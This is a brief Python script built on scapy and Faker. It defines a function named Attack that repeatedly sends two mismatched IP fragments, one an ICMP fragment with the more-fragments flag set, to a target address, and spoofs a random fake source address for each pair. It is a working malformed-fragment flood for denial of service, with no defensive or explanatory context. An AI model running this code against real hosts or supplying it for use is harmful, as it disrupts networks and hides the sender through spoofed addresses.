from scapy.all import IP, ICMP, send
from faker import Faker
import random

fake = Faker()

def Attack(dst_ip, count):
    for i in range(count):
        src_ip = fake.ipv4()
        frag1 = IP(src=src_ip, dst=dst_ip, flags="MF", frag=0)/ICMP()/("X" *500)
        frag2 = IP(src=src_ip, dst=dst_ip, flags=0, frag=100)/("Y" *400)

        send(frag1, verbose=False)
        send(frag2, verbose=False)
    pass